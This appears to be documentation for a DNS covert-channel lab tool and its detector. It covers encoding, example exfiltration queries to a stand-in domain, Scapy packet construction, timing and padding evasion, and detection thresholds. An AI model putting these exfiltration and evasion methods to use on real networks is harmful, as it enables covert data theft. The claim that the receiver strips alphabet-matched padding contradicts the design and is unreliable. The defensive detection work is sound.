# How DNS Covert Channel Exfiltration Works

## Why DNS

DNS is one of the few protocols that traverses nearly every network boundary without inspection. Firewalls that block outbound HTTP, filter HTTPS, or intercept SMTP typically leave UDP port 53 open because breaking DNS breaks everything. DNS traffic is high-volume and routine — a workstation making hundreds of DNS queries per hour is unremarkable. Critically, the attacker's server does not need to send a response for the technique to work; the query itself carries the payload.

This approach has documented real-world use. SUNBURST, the backdoor deployed in the SolarWinds supply chain attack, used DNS to beacon victim hostnames back to attacker infrastructure. DNSMessenger, attributed to FIN7, used TXT record queries as a C2 channel. Cobalt Strike's DNS C2 mode, which remains widely used in red team engagements, exfiltrates data through A-record queries to a team server acting as an authoritative nameserver.

## The Encoding Pipeline

Raw bytes cannot be placed directly into DNS labels — labels are restricted to alphanumeric characters and hyphens, and the DNS wire format limits each label to 63 bytes. The encoder converts payload bytes into a DNS-safe string before transmission.

Three encoding schemes are supported:

- **hex** — each byte becomes two lowercase hex characters. `b"hello"` becomes `68656c6c6f`. Produces labels that use 16 distinct characters and scores ~3.1 bits of Shannon entropy on typical plaintext.
- **base32** — each 5 bits map to one character from a 32-character alphabet (`a-z2-7`). More space-efficient than hex and scores ~4.3 bits of entropy, making it easier for the detector to catch.
- **base64url** — each 6 bits map to one character from a 64-character URL-safe alphabet. Most compact; scores ~4.4 bits of entropy.

The encoded string is split into 30-character chunks. Each chunk becomes a DNS subdomain label following the wire format:

```
{seq:02d}_{tag}_{chunk}.{target-domain}
```

Where `seq` is a zero-padded sequence number, `tag` is the encoding identifier (`h`, `b32`, or `b64`), and `chunk` is the 30-character encoded fragment. A terminator query `done.{target-domain}` marks the end of the session.

**Example:** `b"hello"` encoded in hex becomes:

```
00_h_68656c6c6f.exfil.invalid
done.exfil.invalid
```

## Transmission

Scapy constructs a raw UDP/DNS packet for each FQDN. The packet stack is:

```
IP(dst=dns_server) / UDP(dport=53) / DNS(rd=1) / DNSQR(qname=fqdn, qtype="A")
```

`send()` is used rather than `sr()` — no response is expected or waited for. The sender logs each query at DEBUG level and records per-session statistics in an `ExfilResult` object: chunks sent, bytes encoded, total queries, elapsed time, and queries per second.

Inter-query delay is configurable. The default is 0.5 seconds, producing a regular beacon pattern that the timing detector catches at high confidence.

## Detection Signals

The Python detector evaluates four independent signals for each domain seen in a capture.

**Label length.** Encoded labels average 30–37 characters depending on encoding and whether evasion padding is active. Normal DNS labels — `www`, `api`, `cdn-west-1`, `mail` — average 3–12 characters. Any domain where the average subdomain label exceeds 20 characters is flagged.

**Shannon entropy.** Encoded data has a near-uniform character distribution, which produces high Shannon entropy. Human-readable labels use a small, biased character set and score 2.5–3.5 bits per character. Hex-encoded English text scores around 3.15 bits; base32 and base64 score 4.27 and 4.44 bits respectively. The detection threshold is 3.0 bits.

**Query volume.** More than 20 queries to the same domain within a capture window triggers the volume signal. A 700-byte payload encodes to 46 data queries plus a terminator — well above the threshold.

**Beaconing.** Automated transmission at fixed intervals produces a distinctive timing pattern. The detector computes the coefficient of variation (CV = standard deviation / mean) of inter-query intervals. CV below 0.15 is classified as high-confidence beaconing; CV below 0.30 is medium confidence. The basic sender with a 0.5-second fixed delay produces CV ≈ 0.02.

Confidence is graded `high` when both entropy and label length exceed their thresholds, or when either exceeds its threshold alongside a positive beacon signal. Any single signal grades `medium`.

## Evasion Techniques

The evasion sender applies two modifications:

**Randomised timing.** Inter-query delay is drawn from a uniform distribution between a configurable minimum and maximum (default 0.5–3.0 seconds). This raises the CV from ~0.02 to ~0.48, which exceeds the 0.30 threshold for beacon detection. The timing signal no longer fires.

**Alphabet-matched label padding.** A fixed number of random characters drawn from the encoding's own alphabet are appended to each chunk before transmission. For hex, padding characters are drawn from `0-9a-f`. For base32, from `a-z2-7`. For base64, from the url-safe alphabet. This slightly raises per-label entropy (padding adds character diversity) and increases average label length, but both signals remain above detection thresholds.

The net result: the evasion variant is still detected at high confidence via entropy and label length, but the beacon signal is absent from the output and beacon confidence drops to `low`. The timing evasion worked; the content-based signals did not.

## Receiver Reconstruction

The receiver is a passive UDP server that listens for the encoded queries and reassembles the payload. It parses the encoding tag from each incoming label, stores chunks in a `ChunkBuffer` keyed by `(src_ip, base_domain)`, and on receipt of the `done` terminator calls `reconstruct()`.

Reconstruction strips padding characters by filtering each chunk through the encoding's own character set — hex keeps `[0-9a-fA-F]`, base32 keeps `[a-z2-7]`, base64url keeps `[A-Za-z0-9\-_]` — then decodes the cleaned string using the scheme inferred from the wire tag. This design means the receiver correctly handles evasion-padded sessions without any out-of-band signalling.
